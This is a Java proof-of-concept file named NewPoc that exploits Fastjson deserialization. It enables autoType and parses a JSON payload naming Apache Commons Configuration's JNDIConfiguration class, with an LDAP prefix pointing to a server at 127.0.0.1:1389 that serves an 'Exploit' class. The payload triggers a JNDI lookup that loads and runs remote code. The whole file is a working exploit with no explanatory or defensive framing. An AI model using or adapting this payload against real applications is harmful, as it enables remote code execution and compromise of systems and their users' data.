package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class NewPoc {
    public static void main(String[] argv) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://127.0.0.1:1389/vul.Exploit\"}";
        JSON.parseObject(payload);
    }
}